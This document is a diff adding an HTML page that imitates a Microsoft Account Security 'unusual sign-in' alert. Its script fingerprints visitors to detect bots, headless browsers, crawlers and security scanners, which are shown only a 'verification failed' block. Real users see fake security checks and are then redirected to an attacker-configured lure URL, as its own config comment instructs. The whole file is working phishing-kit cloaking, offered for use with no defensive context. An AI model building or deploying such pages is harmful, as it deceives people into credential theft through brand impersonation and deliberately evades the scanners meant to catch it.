@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Security Alert - Action Required</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%230078d4'/><text x='16' y='22' text-anchor='middle' fill='white' font-size='16' font-family='Arial'>⚠</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#f3f2f1;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:460px;width:90%;overflow:hidden}
+.alert-bar{background:#fff4ce;padding:14px 24px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #f0e6b8}
+.alert-bar .icon{width:24px;height:24px;flex-shrink:0}
+.alert-bar p{font-size:13px;color:#6d5700;font-weight:600}
+.body{padding:32px}
+.ms-logo{display:flex;align-items:center;gap:8px;margin-bottom:24px}
+.ms-logo .grid{display:grid;grid-template-columns:10px 10px;gap:2px}
+.ms-logo .grid span{width:10px;height:10px}
+.ms-logo .grid span:nth-child(1){background:#f25022}.ms-logo .grid span:nth-child(2){background:#7fba00}.ms-logo .grid span:nth-child(3){background:#00a4ef}.ms-logo .grid span:nth-child(4){background:#ffb900}
+.ms-logo p{font-size:14px;color:#5e5e5e}
+h1{font-size:20px;color:#1b1b1b;margin-bottom:10px}
+.desc{font-size:14px;color:#605e5c;line-height:1.6;margin-bottom:28px}
+.scan-list{margin-bottom:24px}
+.scan-item{display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid #f3f2f1}
+.scan-item:last-child{border:none}
+.scan-icon{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0}
+.scan-icon.wait{border:2px solid #ddd;border-top-color:#0078d4;animation:sp .7s linear infinite}
+.scan-icon.ok{background:#107c10;color:#fff}
+.scan-icon.ok::after{content:'✓'}
+.scan-label{font-size:13px;color:#323130}
+@keyframes sp{to{transform:rotate(360deg)}}
+.action{text-align:center;font-size:13px;color:#8a8886}
+.blocked{display:none;padding:16px;background:#fde7e9;border-radius:6px;color:#a80000;font-size:13px;text-align:center}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="alert-bar"><svg class="icon" viewBox="0 0 24 24" fill="#6d5700"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg><p>Security verification required</p></div>
+<div class="body">
+<div class="ms-logo"><div class="grid"><span></span><span></span><span></span><span></span></div><p>Microsoft Account Security</p></div>
+<h1>Unusual Sign-in Activity</h1>
+<p class="desc">We detected an unusual sign-in attempt on your account. Please verify your identity to continue accessing your files.</p>
+<div class="scan-list" id="scans">
+<div class="scan-item" data-i="0"><div class="scan-icon wait"></div><span class="scan-label">Checking device fingerprint</span></div>
+<div class="scan-item" data-i="1"><div class="scan-icon wait"></div><span class="scan-label">Verifying session integrity</span></div>
+<div class="scan-item" data-i="2"><div class="scan-icon wait"></div><span class="scan-label">Validating IP reputation</span></div>
+<div class="scan-item" data-i="3"><div class="scan-icon wait"></div><span class="scan-label">Preparing identity verification</span></div>
+</div>
+<p class="action" id="action">Running security checks...</p>
+<div class="blocked" id="blocked">Verification failed — automated or suspicious activity detected.</div>
+</div>
+</div>
+<script>
+/*──── CONFIG: Replace with your lure URL ────*/
+var REDIRECT_URL = "https://YOUR-LURE-URL-HERE";
+/*────────────────────────────────────────────*/
+
+(function(){
+var items=document.querySelectorAll('.scan-item'),act=document.getElementById('action'),bl=document.getElementById('blocked');
+function bad(){bl.style.display='block';act.style.display='none';document.getElementById('scans').style.display='none'}
+function chk(){
+if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom)return!1;
+if(/bot|crawl|spider|headless|phantom|puppet|selenium|lighthouse|wget|curl|http|scan|preview|fetch|archive|index/i.test(navigator.userAgent))return!1;
+try{var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return!1}catch(e){return!1}
+if(navigator.languages&&navigator.languages.length===0)return!1;
+if(!window.chrome&&/Chrome/.test(navigator.userAgent))return!1;
+if(screen.width<300||screen.height<300)return!1;
+var n=performance.now();for(var i=0;i<1e5;i++)Math.sqrt(i);if(performance.now()-n<0.5)return!1;
+return!0
+}
+if(!chk()){bad();return}
+var step=0;
+var iv=setInterval(function(){
+var icon=items[step].querySelector('.scan-icon');
+icon.classList.remove('wait');icon.classList.add('ok');icon.style.animation='none';
+step++;
+if(step<items.length){act.textContent="Running security checks..."}
+else{clearInterval(iv);act.textContent="Verification passed — redirecting...";setTimeout(function(){window.location.replace(REDIRECT_URL)},700)}
+},1100);
+})();
+</script>
+</body>
+</html>
